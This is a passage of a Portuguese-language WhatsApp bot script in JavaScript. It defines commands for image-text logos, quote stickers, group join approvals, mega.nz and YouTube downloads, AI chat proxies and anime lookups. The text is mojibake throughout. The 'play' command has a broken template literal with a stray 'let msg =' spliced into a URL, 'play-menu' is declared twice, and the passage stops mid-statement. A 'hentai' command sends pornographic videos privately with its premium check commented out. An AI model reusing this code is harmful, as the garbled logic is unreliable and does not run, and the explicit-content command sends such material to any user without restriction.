yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis10.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=62%25&text.0.size=63&text.0.color=004124&text.0.opacity=99&text.0.font.family=Permanent%20Marker&text.0.font.style=italic&text.0.background.color=feff00&text.0.outline.color=ffe8a3&text.0.outline.width=9&text.0.outline.blur=21`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break 

case 'ffrose':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis12.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=65%25&text.0.size=61&text.0.color=ff00e6&text.0.opacity=32&text.0.font.family=Chewy&text.0.font.style=italic&text.0.outline.width=6`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break	

case 'ffgren':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis13.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=63%25&text.0.size=68&text.0.color=ffffff&text.0.opacity=92&text.0.font.family=Permanent%20Marker&text.0.font.weight=800&text.0.outline.color=5dff00&text.0.outline.width=13&text.0.outline.blur=21`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break		

case 'chufuyu':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis14.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=68%25&text.0.size=60&text.0.color=ffffff&text.0.font.family=Sigmar%20One&text.0.font.style=italic&text.0.background.opacity=17&text.0.outline.color=a99cff&text.0.outline.width=9&text.0.outline.blur=16`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break	

case 'wolf':
if (args.length < 1) return reply("cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis15.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=62%25&text.0.size=63&text.0.color=000000&text.0.font.family=Audiowide&text.0.font.style=italic&text.0.background.opacity=15&text.0.outline.color=ffffff&text.0.outline.width=9&text.0.outline.blur=33`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break	

case 'dragonred':
if (args.length < 1) return reply("Cade o texto ?")
teks = q
if (teks.length > 15) return reply('O texto Ã© longo, atÃ© 15 caracteres')
reply(`â–§âƒ¯âƒŸğ™¶ğšğš›ğšŠğš—ğšğš˜ ğš‚ğšğšŠ ğ™»ğš˜ğšğš˜Í˜à¸º.â€¢ğŸ›¸ İ‡İˆâ”€`)
yurimodz = await getBuffer(`https://lollityp.sirv.com/venom_apis16.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=58%25&text.0.size=99&text.0.color=fffefe&text.0.font.family=Permanent%20Marker&text.0.background.color=000000&text.0.outline.color=000000&text.0.outline.width=19&text.0.outline.blur=66`)
yoko.sendMessage(from, { image: yurimodz }, { quoted: selo })
break

case 'qc':
if(!q) return reply(`Para usar este comando Ã© nescessÃ¡rio adicionar algo apÃ³s o comando.`)
reply(mess.wait())
try {ppimg = await yoko.profilePictureUrl(sender, 'image')} catch {ppimg = 'https://telegra.ph/file/24fa902ead26340f3df2c.png'}
await axios.post('https://quote.btch.bz/generate', {"type": "quote", "format": "png", "backgroundColor": "#FFFFFF", "width": 512, "height": 768, "scale": 2, "messages": [{"entities": [], "avatar": true, "from": {"id": 1, "name": pushname, "photo": {"url": ppimg}}, "text": q, "replyMessage": {}}]}, {headers: {'Content-Type': 'application/json'}}).then(async(res) => {
const buffer = new Buffer.from(res.data.result.image, 'base64')
await yoko.sendImageAsSticker(from, buffer, {author: `ğŸ“Œ Criado(a) por: ${NomeDoBot}`})
}).catch(async(error) => {
return reply(mess.error());
})
break

case 'figuweb':
verifText = args.join(" ")
if(!verifText) return reply(mess.syntaxWebSticker(prefix));
let text, colorNumber;
if (q.includes('/')) {[text, colorNumber] = q.split('/')} else {text = q; colorNumber = '1'}
await reagir(from, "ğŸ’¬");
reply("â€¢ Aguarde, estou gerando a figurinha de acordo o que vocÃª solicitou!");
const colorC = {'1': '#000000', '2': '#FFFFFF','3': '#FF0000', '4': '#0000FF'};
const backgroundColor = colorC[colorNumber] || '#000000';
try {ppimg = await yoko.profilePictureUrl(sender, 'image')} catch {ppimg = 'https://telegra.ph/file/b5427ea4b8701bc47e751.jpg'}
axios.post('https://quote.btch.bz/generate', {"type": "quote", "format": "png", "backgroundColor": backgroundColor, "width": 512, "height": 768, "scale": 2, "messages": [{"entities": [], "avatar": true, "from": {"id": 1, "name": pushname, "photo": {"url": ppimg}}, "text": text, "replyMessage": {}}]}, {headers: {'Content-Type': 'application/json'}}).then(async(resultar) => {
const bufferE = new Buffer.from(resultar.data.result.image, 'base64')
await yoko.sendImageAsSticker(from, bufferE, {author: `ğŸ“Œ Criado(a) por: ${NomeDoBot}`})
}).catch(async(error) => {
return reply(mess.error());
})
break

case 'autorizar':
case 'autoriza':
if (!isGroup) return reply(mess.onlyAdmins());
if (!isGroupAdmins) return reply(mess.onlyGroup());
const solAll = await yoko.groupRequestParticipantsList(from);
if (solAll == false) return reply('Sem solicitaÃ§Ãµes pendentes.');
let formattedString = solAll.map(item => `â€¢ UsuÃ¡rio: *@${item.jid.replace('@s.whatsapp.net', '')}*\nâ€¢ MÃ©todo de RequisiÃ§Ã£o: *${item.request_method}*\nâ€¢ Tempo: *${moment.unix(item.request_time).format('LLL')}*`).join('\nâ€”â€”â€”\n');
mention(`[âš ï¸] - *SOLICITAÃ‡Ã•ES PENDENTES:*\n${formattedString}\nâ€“\nâ€¢ ArgumentaÃ§Ãµes nescessÃ¡rias do comando: _SIM - NÃƒO - ALL - NOALL_\nâ€¢ OpÃ§Ã£o: _"SIM"_ -> Aprovar a solicitaÃ§Ã£o do usuÃ¡rio(a) no grupo.\nâ€¢ OpÃ§Ã£o: _"NÃƒO"_ -> Rejeite todos os usuÃ¡rios sem aprovaÃ§Ã£o.\nâ€¢ OpÃ§Ã£o: _"ALL"_ -> Aprovar todos os solitantes da requisiÃ§Ã£o no grupo.\nâ€¢ OpÃ§Ã£o: _"NOALL"_ -> Rejeite todos os solitantes de uma vez.`);
awaitMessage({chatJid: from, sender: sender, expectedMessages: ["sim", "nao", "nÃ£o", "all", "noall", "exit"], filter: (info) => info?.message?.extendedTextMessage?.text || info?.message?.conversation}, yoko)
.then(async(collected) => {
const AutoResp = collected?.message?.extendedTextMessage?.text || collected?.message?.conversation;
const lowerCaseAutoResp = AutoResp.toLowerCase(); // Convert the user's input to lowercase
if (/sim/gi.test(lowerCaseAutoResp)) {
await yoko.groupRequestParticipantsUpdate(from, [solAll[0].jid], 'approve');
} else if (/nÃ£o|nao/gi.test(lowerCaseAutoResp)) {
await yoko.groupRequestParticipantsUpdate(from, [solAll[0].jid], 'reject');
} else if (/noall/gi.test(lowerCaseAutoResp)) {
for (let i = 0; i < solAll.length; i++) {
await yoko.groupRequestParticipantsUpdate(from, [solAll[i].jid], 'reject');
}
} else if (/all/gi.test(lowerCaseAutoResp)) {
for (let i = 0; i < solAll.length; i++) {
await yoko.groupRequestParticipantsUpdate(from, [solAll[i].jid], 'approve');
}
}
}).catch(async (err) => {
console.log(err)
});
break;


case 'megadl':
if (!q.includes("mega.nz")) return reply(`VocÃª esqueceu de colocar um link do *mega.nz* apÃ³s o comando.`);
try {
const { File } = require("megajs");
const fileListINFO = await File.fromURL(q);
await fileListINFO.loadAttributes(); // Rodar a funÃ§Ã£o para executar o resultado.
if (fileListINFO.size >= 300000000) return reply(`ğŸ˜¿ Infelizmente, nÃ£o foi possÃ­vel concluir a aÃ§Ã£o, *pois o tamanho do arquivo excede o limite mÃ¡ximo de 300MB.*`);
function formatSize(bytes){if(bytes >= 1073741824) {bytes = (bytes / 1073741824).toFixed(2) + " GB"} else if (bytes >= 1048576) {bytes = (bytes / 1048576).toFixed(2) + " MB"} else if(bytes >= 1024) {bytes = (bytes / 1024).toFixed(2) + " KB"} else if(bytes > 1) {bytes = bytes + " bytes"} else if(bytes == 1) {bytes = bytes + " byte"} else {bytes = "0 bytes"} return bytes};
await replyWithNewsletter(`ğŸ¤–ğŸ’« Por favor, aguarde alguns minutos! O arquivo estÃ¡ sendo baixado!\nâ€¢ Arquivo: *${fileListINFO.name}* - [${formatSize(fileListINFO.size)}]`, {forwardingScore: 10000, isForwarded: true, forwardedNewsletterMessageInfo: {newsletterJid: channel}}, info);
const dataFileBuffer = await fileListINFO.downloadBuffer();
// Adicionadas extensÃµes suportadas (zip, rar, 7z, jpg, png, zip) Ã  lista.
if (/mp4/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: fileListINFO.name, mimetype: "video/mp4", fileName: `Download Completo! Obrigado por esperar *${pushname}*...`}, {quoted: selo});
} else if (/mp3|mpeg/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: fileListINFO.name, mimetype: "audio/mpeg", fileName: `Download Completo! Obrigado por esperar *${pushname}*...`}, {quoted: selo});
} else if (/pdf/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: `Download Completo: *100%* - ${fileListINFO.name}`, mimetype: "application/pdf", fileName: fileListINFO.name}, {quoted: selo});
} else if (/txt/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: `Download Completo! Obrigado por esperar *${pushname}*...`, mimetype: "text/plain", fileName: fileListINFO.name}, {quoted: selo});
} else if (/zip/.test(fileListINFO.name)) {
await yoko.sendMessage(from, { document: dataFileBuffer, caption: `Download Completo! Obrigado por esperar *${pushname}*...`, mimetype: "application/zip", fileName: fileListINFO.name}, {quoted: selo});
} else if (/rar/.test(fileListINFO.name)) {
await yoko.sendMessage(from, { document: dataFileBuffer, caption: `Download Completo! Obrigado por esperar *${pushname}*...`, mimetype: "application/x-rar-compressed", fileName: fileListINFO.name }, {quoted: selo});
} else if (/7z/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: `Download Completo! Obrigado por esperar *${pushname}*...`, mimetype: "application/x-7z-compressed", fileName: `${fileListINFO.name}` }, {quoted: selo});
} else if (/jpg|jpeg/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: `Download Completo! Obrigado por esperar *${pushname}*...`, mimetype: "image/jpeg", fileName: fileListINFO.name}, {quoted: selo});
} else if (/png/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: `Download Completo! Obrigado por esperar *${pushname}*...`, mimetype: "image/png", fileName: fileListINFO.name}, {quoted: selo});
} else if (/apk/.test(fileListINFO.name)) {
await yoko.sendMessage(from, {document: dataFileBuffer, caption: `Download Completo! Obrigado por esperar *${pushname}*...`, mimetype: "application/vnd.android.package-archive", fileName: fileListINFO.name}, {quoted: selo});
} else {
return reply('Desculpe-me, ocorreu um erro ao encaminhar o arquivo!ğŸ˜¿ O formato de arquivo apresentado nÃ£o Ã© suportado.');
}
} catch (error) {
return console.log(`Error: ${error.message}`);
}
break

case 'encurtalink': case 'tinyurl':
if(args.length < 1) return reply(`âŒï¸ *Forma incorreta, use estÃ¡ como exemplo:* ${prefix + command} https://instagram.com/annabot.wpp`)
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${q}`)
reply(`*Link encurtado com sucesso, aqui estÃ¡:* ${anu.data}`).catch(async(error) => {
reply(mess.error())
})
break

case 'shazam': {
    console.log("Iniciando o comando 'shazam'");

    if (!isQuotedAudio && !isQuotedVideo) {
        console.log("Nenhum Ã¡udio ou vÃ­deo foi marcado.");
        return reply('ğŸ¶ *Envie um Ã¡udio ou vÃ­deo para que eu possa detectar o nome da mÃºsica!*');
    }

reply('*Aguarde sÃ³ um instante isso pode demorar alguns minutos..*')

    const ffmpeg = require('fluent-ffmpeg');
    const fs = require('fs');
    const path = require('path');
    const shazam = require('node-shazam');
    const { Shazam } = shazam;
    const shazamInstance = new Shazam();

    const tmpDir = './temp';
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir);
    let audioPath, tempVideoPath;

    try {
        if (isQuotedAudio) {
            console.log("Ãudio citado encontrado, processando...");
            const audioBuffer = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, 'audio');
            audioPath = path.join(tmpDir, `${Date.now()}-${sender}.mp3`);
            fs.writeFileSync(audioPath, audioBuffer);
        } else if (isQuotedVideo) {
            console.log("VÃ­deo citado encontrado, salvando arquivo...");
            const videoBuffer = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage, 'video');
            tempVideoPath = path.join(tmpDir, `${Date.now()}-${sender}.mp4`);
            audioPath = path.join(tmpDir, `${Date.now()}-${sender}.mp3`);
            fs.writeFileSync(tempVideoPath, videoBuffer);

            console.log("Convertendo vÃ­deo para Ã¡udio...");
            await new Promise((resolve, reject) => {
                ffmpeg(tempVideoPath)
                    .audioCodec('libmp3lame')
                    .audioBitrate(128)
                    .save(audioPath)
                    .on('end', () => {
                        console.log("ConversÃ£o de vÃ­deo para Ã¡udio concluÃ­da.");
                        resolve();
                    })
                    .on('error', (err) => {
                        console.error("Erro durante a conversÃ£o:", err);
                        reject("Erro ao converter o vÃ­deo para Ã¡udio.");
                    });
            });
            fs.unlinkSync(tempVideoPath); // Remove o vÃ­deo temporÃ¡rio
        } else {
            return reply("Marque um Ã¡udio ou vÃ­deo para realizar a identificaÃ§Ã£o.");
        }

        console.log("Enviando mensagem para informar sobre a anÃ¡lise do Ã¡udio...");
        await yoko.sendMessage(from, { text: `ğŸ” *Analisando o Ã¡udio...*\n> Um momento enquanto identifico a mÃºsica!` }, { quoted: info });

        console.log("Enviando o Ã¡udio para o Shazam...");
        const resultado = await shazamInstance.fromFilePath(audioPath, false, 'en');
        console.log("Resultado da identificaÃ§Ã£o da mÃºsica:", resultado);

        if (resultado && resultado.track) {
            const { title, subtitle, album, release_date, url, images } = resultado.track;
            let mensagemResultado = `ğŸ¶ *MÃºsica Detectada!*\n\n`;
            mensagemResultado += `ğŸ¤ *Artista:* ${subtitle}\n`;
            mensagemResultado += `ğŸµ *TÃ­tulo:* ${title}\n`;
            mensagemResultado += `ğŸ’½ *Ãlbum:* ${album?.title || 'N/A'}\n`;
            mensagemResultado += `ğŸ“… *Data de LanÃ§amento:* ${release_date || 'N/A'}\n`;
            mensagemResultado += `ğŸ”— *Link:* ${url || 'N/A'}\n`;

            console.log("MÃºsica detectada:", mensagemResultado);

            if (images?.coverart) {
                await yoko.sendMessage(from, { image: { url: images.coverart }, caption: mensagemResultado }, { quoted: info });
            } else {
                await yoko.sendMessage(from, { text: mensagemResultado }, { quoted: info });
            }
           
                try {
        const yts = require('yt-search');
        console.log('Entrada recebida:', title);
        const isLink = q.includes('https://');
        let videoData;
        if (!isLink) {
            const searchResults = await yts(title);
            console.log('Resultados da busca:', searchResults);
            if (searchResults.videos.length === 0) {
                return reply('Nenhum resultado encontrado para o tÃ­tulo informado.');
            }
            videoData = searchResults.videos[0]; 
        } else {
            videoData = { url: title };
        }
        const audioPath = await downloadAudio2(videoData.url);
        if (!audioPath) {
            throw new Error('Erro ao processar o download. Caminho do arquivo nÃ£o encontrado.');
        }
        const playInfo = {
            title: videoData.title || "TÃ­tulo indisponÃ­vel",
            canal: videoData.author?.name || "Canal nÃ£o informado",
            duration: videoData.timestamp || "DuraÃ§Ã£o nÃ£o disponÃ­vel",
            views: videoData.views || "VisualizaÃ§Ãµes nÃ£o disponÃ­veis",
            image: videoData.image || "thumb nÃ£o disponÃ­veis"
        }; 
        await yoko.sendMessage(from, { audio: { url: audioPath }, mimetype: "audio/mpeg" }, { quoted: info });
        fs.unlink(audioPath, (err) => {
            if (err) console.error('Erro ao excluir o arquivo de Ã¡udio:', err);
        });
    } catch (err) {
        console.error("Erro ao processar o comando 'play':", err);
        await reply('Ocorreu um erro ao processar sua solicitaÃ§Ã£o. Por favor, tente novamente.');
    }
        } else {
            console.log("MÃºsica nÃ£o reconhecida.");
            await yoko.sendMessage(from, { text: `âš ï¸ *MÃºsica nÃ£o reconhecida!*\n> NÃ£o foi possÃ­vel identificar a mÃºsica. Tente enviar outra amostra.` }, { quoted: info });
        }
    } catch (error) {
        console.error("Erro ao processar o comando 'shazam':", error);
        await yoko.sendMessage(from, { text: `âš ï¸ *Erro ao processar sua solicitaÃ§Ã£o!*\n> Ocorreu um erro. Tente novamente mais tarde.` }, { quoted: info });
    } finally {
        if (audioPath && fs.existsSync(audioPath)) fs.unlinkSync(audioPath);
        if (tempVideoPath && fs.existsSync(tempVideoPath)) fs.unlinkSync(tempVideoPath);
    }
    break;
}
case 'hentai':
//if(!isPremium) return reply("Apenas premium..")
    reply('AGUARDE...ğŸ˜ˆ')
    const { hentai } = require('./yoko/src/hentai.js');
    async function mostrarVideos() {
        try {
            const videos = await hentai(); 
            if (!videos || videos.length === 0) {
                return yoko.sendMessage(from, { text: 'Nenhum vÃ­deo encontrado.' });
            }
            reply('estou enviando no seu privado')
            videos.forEach((video, index) => {
                const infohentai = `
                Video ${index + 1}:
                TÃ­tulo: ${video.title}
                Link: ${video.link}
                Categoria: ${video.category}
                Compartilhamentos: ${video.share_count}
                VisualizaÃ§Ãµes: ${video.views_count}
                Tipo: ${video.type}
                `;
                yoko.sendMessage(sender, { video: { url: video.video_1 } }, { quoted: info })
                if (video.video_2) {
                    yoko.sendMessage(sender, { video: { url: video.video_2 } }, { quoted: info})
                }
            });
        } catch (error) {
            console.error('Erro ao buscar vÃ­deos:', error);
            yoko.sendMessage(from, { text: 'Houve um erro ao buscar os vÃ­deos. Tente novamente mais tarde.' });
        }
    }
    mostrarVideos();
    break
    


case 'encurtarlik':
if (!q) return reply('VocÃª se esqueceu do link!');
     async function encurtarURL(urlOriginal) {
        try {
            const apiUrl = `https://is.gd/create.php?format=simple&url=${encodeURIComponent(urlOriginal)}`;
            const resposta = await axios.get(apiUrl);
            return resposta.data;
        } catch (erro) {
            console.error('Erro ao encurtar URL:', erro.message);
            return null;
        }
    }
    const resulto = await encurtarURL(q);
    if (resulto) {
        reply(`Aqui estÃ¡ seu link encurtado ğŸ”—: ${resulto}`);
    } else {
        reply('Ocorreu um erro ao encurtar o link, tente novamente!');
    }
    break;

//==========(IAS)==========//


case 'gpt4':
if (!q) return reply('Digite oque deseja Saber')
herc.question({model:"v3",content: q}).then(response => {
console.log(response.reply);
reply(response.reply)
});
break


case 'gpt32k':
if (!q) return reply('Digite oque deseja Saber')
herc.question({model:"v3-32k",content: q}).then(response => {
console.log(response.reply);
reply(response.reply)
});
break
case 'yoko':
case 'yokozinho':
texte = `Voce Ã© um chatbot programador pra responder igual a um personagem de anime conhecido como yoko do anime claasroom of the elite, responda e interprete as informaÃ§Ãµes a seguir como o personagem: ${q}`
//texte =+ q
console.log(texte)
await herc.question({model:"gemini",content: texte}).then(response => {
console.log(response.reply);
reply(response.reply)
});
break

case 'gemini':
if (!q) return reply('Digite oque deseja Saber')
await herc.question({model:"gemini",content: q}).then(response => {
console.log(response.reply);
reply(response.reply)
});
break

case 'gpt':
if (!q) return reply('Digite oque deseja Saber')
herc.question({model:"turbo",content: q}).then(response => {
console.log(response.reply);
reply(response.reply)
});
break

case 'gpt3-5':
if (!q) return reply('Digite oque deseja Saber')
herc.question({model:"turbo-16k",content: q}).then(response => {
console.log(response.reply);
reply(response.reply)
});
break

case 'gptv4':
if (!q) return reply('Digite oque deseja Saber')
herc.question({model:"llama3-8b",content: q}).then(response => {
console.log(response.reply);
reply(response.reply)
});
break
//==========(ANIMES)==========\\


    
    case 'animeinfo':
    if (!q) return reply(`Exemplo: ${prefix}animeinfo Black Clover`);
    reply(enviar.aguarde);
    async function buscarAnime(nome) {
        try {
            const url = `https://api.jikan.moe/v4/anime?q=${encodeURIComponent(nome)}&limit=1`;
            const resposta = await axios.get(url);
            const anime = resposta.data.data[0];

            if (anime) {
                const { 
                    title, 
                    url, 
                    type, 
                    score, 
                    members, 
                    status, 
                    synopsis, 
                    favorites, 
                    images, 
                    genres 
                } = anime;

                const translatedSynopsis = (await googleTranslate(synopsis, { to: 'pt' })).text.replace(/\n/g, ' ');

                const translatedGenresPromises = genres.map(async genre => {
                    const translated = await googleTranslate(genre.name, { to: 'pt' });
                    return translated.text;
                });
                const genresInPortuguese = (await Promise.all(translatedGenresPromises)).join(', ');
                const messageCaption = `
                    *TÃ­tulo*: ${title}
                    *Tipo*: ${type === 'TV' ? 'SÃ©rie de TV' : type}
                    *Nota*: ${score} / 10
                    *Membros*: ${members.toLocaleString('pt-BR')} usuÃ¡rios
                    *Status*: ${status === 'Finished Airing' ? 'Finalizado' : status}
                    *Favoritos*: ${favorites.toLocaleString('pt-BR')}
                    *GÃªneros*: ${genresInPortuguese}
                    *Sinopse*: ${translatedSynopsis}
                    
                    *Mais informaÃ§Ãµes*: [Clique aqui](${url})
                `.trim();

                await yoko.sendMessage(from, {
                    image: { url: images.jpg.image_url }, 
                    caption: messageCaption
                }, { quoted: info });

            } else {
                reply('Nenhum anime encontrado!');
            }
        } catch (erro) {
            console.error("Erro ao buscar anime:", erro.message);
            reply('Ocorreu um erro ao buscar informaÃ§Ãµes sobre o anime. Tente novamente.');
        }
    }

    const googleTranslateModule = await import('@vitalets/google-translate-api');
    const googleTranslate = googleTranslateModule.default.translate;

    await buscarAnime(q);
    break;
    
    
case 'play-search':
case 'play-menu':
await reagir(from, "â™¦ï¸");
//await carregamento()
//await sleep(2000)
if(!q) return reply(mess.syntaxDownloadMusic());
data = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/pesquisa_ytb?nome=${q}&apikey=${API_KEY_BRONXYS}`);

fs.writeFileSync(`./yoko/bunker/database/data/media/images/play-thumb.jpg`, await getBuffer(data[0].thumb));
await salvarLink(`${data[0].url}`, `${data[0].titulo}`, `${data[0].thumb}`, sender);
const dadoss = resgatarLinks();
console.log(dadoss);

await yoko.sendIMG('./yoko/bunker/database/data/media/images/play-thumb.jpg', 
from, 
`ã€Œ â™¦ï¸â¯â¯ ğ˜—ğ˜“ğ˜ˆğ˜  AYANOKOJI â®â®â™¦ï¸ ã€
*ğ˜›Ã­ğ˜µğ˜¶ğ˜­ğ˜°:* _${data[0].titulo}_
*ğ˜‹ğ˜¶ğ˜³ğ˜¢Ã§Ã£ğ˜°:* _${data[0].tempo}_.
*ğ˜“ğ˜ªğ˜¯ğ˜¬:* _${data[0].url}_.
ã€Œâ¯â¯ FORMATOS â®â®ã€
> "ÃUDIO"
> "VIDEO"
> "DOC"
> OBS MANDE SOMENTE O TEXTO SEM AS ASPAS
Â© AYANOKOJI V1 MD`,
{participant: sender, 
quotedMessage: info.message},
);
break
case 'playteste':
case 'play-menu':
await reagir(from, "â™¦ï¸");
if(!q) return reply(mess.syntaxDownloadMusic());
data = await fetchJson(`https://zero-two.online/api/ytsrc?q=${q}&apikey=${API_KEY_YOKO}`);

fs.writeFileSync(`./yoko/bunker/database/data/media/images/play-thumb.jpg`, await getBuffer(data[0].thumb));
await await yoko.sendIMG('./yoko/bunker/database/data/media/images/play-thumb.jpg', 
from, 
`ã€Œ ğŸŒ¸â¯â¯ ğ˜—ğ˜“ğ˜ˆğ˜  YOKO â®â®ğŸŒ¸ ã€
*ğ˜›Ã­ğ˜µğ˜¶ğ˜­ğ˜°:* _${data[0].titulo}_
*ğ˜‹ğ˜¶ğ˜³ğ˜¢Ã§Ã£ğ˜°:* _${data[0].tempo}_.
*ğ˜“ğ˜ªğ˜¯ğ˜¬:* _${data[0].url}_.
Â©  YOKO BOT V6`,
{participant: sender, 
quotedMessage: info.message},
);
await yoko.sendMessage(from, { audio: {url: `https://zero-two.online/api/ytsrc?q=${q}&apikey=${API_KEY_YOKO}`}, mimetype: "audio/mpeg",
},{quoted: info})
break
case 'play':
case 'p':
try {
let q = args.join(" ").trim();
if (!q) return reply(`*Exemplo:* ${prefix+command} "teto m4"`);
await reagir(from, 'â³')
const Api = await fetchJson(`https://carisys.online/api/pesquisas/youtube?query=${encodeURIComponent(q)}`)
var nullo = 'NÃ£o encontrei resultados!'
await reagir(from, 'âœ…')
let thumbnail = 'https://files.catbox.moe/k3itl7.jpg'; // Imagem padrÃ£o
let music_name = args.join(" ");
let artist_name = "Apis"; // Nome do artista padrÃ£o (pode mudar)
let time_end = "3:00"; // Tempo final padrÃ£o
let url = `http://speedhosting.cloud:2009/canvas/musicard?thumbnail=${thumbnail}&music_name=
let msg =${encodeURIComponent(q)}`
var tation = `
*á´˜á´‡á´…Éªá´…á´ sá´ÊŸÉªá´„Éªá´›á´€á´…á´ á´˜á´Ê€: @${sender.split('@')[0]}*\n
> *ğŸŒ¸*á´›Éªá´›ÊŸá´‡:* ${Api.resultado.titulo||nullo}
> *ğŸŒ¸*á´ Éªá´‡á´¡s:* ${Api.resultado.views||nullo}
> *ğŸŒ¸*á´…á´‡sá´„Ê€Éªá´˜á´›Éªá´É´:* ${Api.resultado.descricao||nullo}
*1:28 ${Api.resultado.duracao}*
*á´ á´ÊŸá´œá´á´‡ : â–®â–®â–®â–®â–®â–®â–®â–®â–¯â–¯â–¯*\n
*_â¯â¯YOKO ğ’ğ˜ğ’ğ“ğ„ğŒâ®â®_*`
await yoko.sendMessage(from, {image: {url: Api.resultado.imagem}, caption: tation, contextInfo:{ mentionedJid:[sender]}}, {quoted: info})
await yoko.sendMessage(from, {audio: {url:`https://carisys.online/api/downloads/youtube/mp3-2?url=${Api.resultado.url}`}, mimetype: "audio/mpeg"}, {quoted: info});
} catch (error) {
console.log(error);
return reply(`Deu erro, tente novamente mais tarde`);
}
break
case 'play2':
    try {
        const yts = require('yt-search');
        if (!q) return reply('Por favor, insira o nome da mÃºsica.');
        console.log('Entrada recebida:', q);
        const isLink = q.includes('https://');
        let videoData;
        if (!isLink) {
            const searchResults = await yts(q);
            console.log('Resultados da busca:', searchResults);
            if (searchResults.videos.length === 0) {
                return reply('Nenhum resultado encontrado para o tÃ­tulo informado.');
            }
            videoData = searchResults.videos[0]; 
        } else {
            videoData = { url: q };
        }
        reply('Iniciando o download do Ã¡udio, aguarde um momento...');
        const audioPath = await downloadAudio2(videoData.url);
        
        if (!audioPath) {
        console.log('erro')
           // throw new Error('Erro ao processar o download. Caminho do arquivo nÃ£o encontrado.');
        }
        const playInfo = {
            title: videoData.title || "TÃ­tulo indisponÃ­vel",
            canal: videoData.author?.name || "Canal nÃ£o informado",
            duration: videoData.timestamp || "DuraÃ§Ã£o nÃ£o disponÃ­vel",
            views: videoData.views || "VisualizaÃ§Ãµes nÃ£o disponÃ­veis",
            image: videoData.image || "thumb nÃ£o disponÃ­veis"
        }; 
        const infoText = `*TÃ­tulo:* ${playInfo.title}\n*Canal:* ${playInfo.canal}\n*DuraÃ§Ã£o:* ${playInfo.duration}\n*VisualizaÃ§Ãµes:* ${playInfo.views}`;  
       await yoko.sendMessage(from, { image: {url: `${playInfo.image}`}, caption: infoText }, { quoted: info });
        await yoko.sendMessage(from, { audio: { url: audioPath }, mimetype: "audio/mpeg" }, { quoted: info });
        fs.unlink(audioPath, (err) => {
            if (err) console.error('Erro ao excluir o arquivo de Ã¡udio:', err);
        });
    } catch (err) {
        console.error("Erro ao processar o comando 'play':", err);
        await reply('Ocorreu um erro ao processar sua solicitaÃ§Ã£o. Por favor, tente novamente.');
    }
    break;

case 'ytmp3-1'://criador da case: nunu & franky x
const ytdlv = require("@distube/ytdl-core");

  if (!q) return reply('Coloque o nome da mÃºsica tambÃ©m');
  reply("ğŸ—¡ consegue esperar 2 minutos? mandando...");//criador da case: nunu & franky x

  const searchUrl = q
  fetch(searchUrl)
    .then(response => response.text())
    .then(body => {
      const videoId = body.match(/"videoId":"(.*?)"/)[1];
      const videoUrl = `http://www.youtube.com/watch?v=${videoId}`;
      return ytdlv(videoUrl, { filter: 'audioonly' });
    })//criador da case: nunu & franky x
    .then(stream => {
      const chunks = [];
      stream.on('data', chunk => chunks.push(chunk));
      stream.on('end', () => {
        const audioBuffer = Buffer.concat(chunks);
        yoko.sendMessage(from, {
          audio: audioBuffer,
          mimetype: 'audio/mpeg',
          headerType: 4,
 contextInfo: {
 externalAdReply: {
 title: 'AYANOKOJI V1 MD',
 showAdAttribution: true,
 thumbnailUrl: 'https://pomf2.lain.la/f/y6gwa233.png',
 mediaType: 1,
 renderLargerThumbnail: true,
 mediaUrl: `instagram.com`,
 sourceUrl: `https://Youtube.com`
 }
 }
